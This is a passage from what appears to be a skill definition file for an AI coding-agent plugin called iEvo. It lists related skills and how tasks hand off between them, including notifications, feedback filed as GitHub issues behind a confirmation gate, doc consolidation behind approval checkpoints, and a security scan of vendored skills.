- `hooks-setup/SKILL.md` — `/ievo:hooks-setup` configures a Claude Code hook that fires when the signal file `.ievo/hooks/evolution-captured` is written by Step 5.5 above (lets you get a desktop notification on every capture).
- `feedback/SKILL.md` — `/ievo:feedback` files a lesson upstream as a public GitHub issue in `ievo-ai/skills`. Step 5.6 above hands off to it (flow C, lesson pre-filled) when a captured lesson looks like it's about the iEvo plugin itself; public posting stays behind that skill's explicit confirmation gate (its Step 5).
- `consolidate/SKILL.md` — `/ievo:consolidate` restructures fragmented docs (doc-graph mode) or extracts a generalizable cluster of overlay entries into a new project-local skill/agent (entry-cluster mode). Step 5.7 above hands off to it, scoped to `root=<overlay path>`, for any overlay — `project.md`, an agent's, or a skill's — whose accumulated entries look like they describe one recurring procedure or role. All extraction stays behind `consolidate`'s own 3 checkpoints — nothing is removed from the overlay without explicit approval there.
- `extract-best-practices/SKILL.md` — mines a live session for patterns nobody ever `/evo`'d, independent of whether anything is captured in an overlay. Its "too narrow" and "refines an existing target" candidates hand off here (this skill's own scope/target classification in Step 1 resolves where they land); a genuinely new, generalizable pattern instead becomes a new skill/agent there, with its own Step 5.6-style upstream-sharing offer for the resulting package.
- `security-check/SKILL.md` — the antivirus deep-scan methodology Step 2.5 above applies to a freshly-vendored agent/skill before it touches `.claude/agents/`/`.claude/skills/` (or `.agents/skills/` on Codex), either via a dispatched `security-auditor` sub-agent (Claude Code/Codex) or applied directly (other platforms). Same skill `/ievo:init` Step 8 and `/ievo:update` Step 2.5 already gate on.
- `init/SKILL.md` Step 12.5, `evo-auto-enable/SKILL.md` Step 5.5 — a third way lessons reach this skill besides an explicit `/ievo:evo` call or the auto-evolution backlog (Step 0 above): a skill's own mid-run self-check catching its printed output mismatching the detected platform hands off here directly, with scope/target already fixed (`agent self-correction: platform-detection mismatch`, Step 5's Trigger list). Step 1's overlay-only carve-out governs that path — no target resolution, no clarifying question, and no vendoring/re-audit/marker injection of the plugin-shipped skill; it goes straight to Step 4, then Steps 5.6 and 5.7 offer their usual conditional gates.
